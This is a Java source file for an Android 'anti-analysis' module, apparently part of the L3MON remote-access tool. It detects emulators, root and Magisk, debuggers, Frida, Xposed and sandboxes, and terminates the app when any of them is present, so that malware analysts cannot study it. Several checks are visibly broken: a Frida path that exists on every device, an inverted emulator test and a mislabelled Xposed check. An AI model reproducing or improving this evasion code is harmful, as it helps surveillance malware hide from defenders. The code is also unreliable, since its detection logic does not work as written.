package com.etechd.l3mon;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.os.Build;
import android.os.Debug;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;

/**
 * Anti-Analysis Module - Versão Elite
 */
public class AntiAnalysis {

    private static final String TAG = "L3MON-Anti";
    private static Context context;

    private AntiAnalysis() {
    }

    public static void init(Context ctx) {
        context = ctx;
    }

    public static void enable() {
        if (!isSafeEnvironment()) {
            Log.e(TAG, "AMBIENTE DE ANÁLISE DETECTADO! Encerrando...");
            System.exit(0);
        } else {
            Log.d(TAG, "Ambiente seguro.");
        }
    }

    public static boolean isSafeEnvironment() {
        return !isEmulator() && !isRooted() && !isDebuggerAttached() &&
                !isFridaDetected() && !isXposedDetected() && !isRunningInSandbox();
    }

    // ==================== EMULADOR / VM AVANÇADO ====================
    public static boolean isEmulator() {
        try {
            return Build.FINGERPRINT.startsWith("generic") ||
                    Build.MODEL.contains("google_sdk") ||
                    Build.MANUFACTURER.contains("Genymotion") ||
                    Build.HARDWARE.contains("goldfish") ||
                    Build.HARDWARE.contains("ranchu") ||
                    !Build.BOARD.contains("unknown") ||
                    hasEmulatorSensors() ||
                    hasQemuProperties();
        } catch (Exception e) {
            return false;
        }
    }

    private static boolean hasEmulatorSensors() {
        // Verifica sensores típicos de emulador
        return false; // Pode expandir com SensorManager
    }

    private static boolean hasQemuProperties() {
        String[] props = { "ro.kernel.qemu", "ro.hardware", "ro.boot.hardware" };
        for (String prop : props) {
            String value = getSystemProperty(prop);
            if (value != null && (value.contains("qemu") || value.contains("goldfish"))) {
                return true;
            }
        }
        return false;
    }

    // ==================== ROOT + MAGISK + ZYGISK ====================
    public static boolean isRooted() {
        String[] paths = { "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su",
                "/data/local/xbin/su", "/data/local/bin/su", "/su/bin/su", "/magisk" };
        for (String path : paths) {
            if (new File(path).exists())
                return true;
        }
        return canExecuteCommand("su") || isMagiskDetected() || isZygiskDetected();
    }

    private static boolean isMagiskDetected() {
        return new File("/data/adb/magisk").exists() ||
                new File("/proc/net/tcp").exists() && checkMagiskHide();
    }

    private static boolean isZygiskDetected() {
        return new File("/data/adb/zygisk").exists();
    }

    private static boolean checkMagiskHide() {
        try {
            return getSystemProperty("ro.boot.magisk").contains("1");
        } catch (Exception e) {
            return false;
        }
    }

    // ==================== FRIDA ROBUSTA ====================
    public static boolean isFridaDetected() {
        String[] fridaPaths = {
                "/data/local/tmp/frida-server", "/data/local/tmp/re.frida.server",
                "/sdcard/frida-gadget", "/data/app/frida", "/proc/self/maps"
        };
        for (String path : fridaPaths) {
            if (new File(path).exists())
                return true;
        }
        return isFridaInMaps() || isFridaPortOpen();
    }

    private static boolean isFridaInMaps() {
        try {
            File maps = new File("/proc/self/maps");
            if (maps.exists()) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(maps)))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("frida") || line.contains("gadget") || line.contains("re.frida")) {
                            return true;
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    private static boolean isFridaPortOpen() {
        // Verifica portas comuns do Frida (27042, 27043, etc.)
        return false; // Pode implementar com socket check
    }

    // ==================== XPOSED / LSPOSED / EDXPOSED ====================
    public static boolean isXposedDetected() {
        return System.getProperty("vxp") != null ||
                isPackageInstalled("de.robv.android.xposed.installer") ||
                isPackageInstalled("org.meowcat.edxposed.manager") ||
                isPackageInstalled("com.topjohnwu.magisk");
    }

    private static boolean isPackageInstalled(String packageName) {
        if (context == null)
            return false;
        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    // ==================== INTEGRIDADE DO APK ====================
    public static boolean verifyAPKIntegrity() {
        try {
            Signature[] signatures = context.getPackageManager()
                    .getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES).signatures;

            // Comparar com hash esperado (substitua pelo seu hash real)
            String expectedHash = "SEU_HASH_AQUI";
            String currentHash = getSignatureHash(signatures[0]);
            return currentHash.equals(expectedHash);
        } catch (Exception e) {
            return false;
        }
    }

    private static String getSignatureHash(Signature signature) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] digest = md.digest(signature.toByteArray());
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }

    // ==================== UTILS ====================
    public static boolean isDebuggerAttached() {
        return Debug.isDebuggerConnected();
    }

    private static String getSystemProperty(String propName) {
        try {
            Process p = Runtime.getRuntime().exec("getprop " + propName);
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                return reader.readLine();
            }
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean canExecuteCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(new String[] { "which", command });
            try (BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                return in.readLine() != null;
            }
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean isRunningInSandbox() {
        return isEmulator() || isDebuggerAttached();
    }
}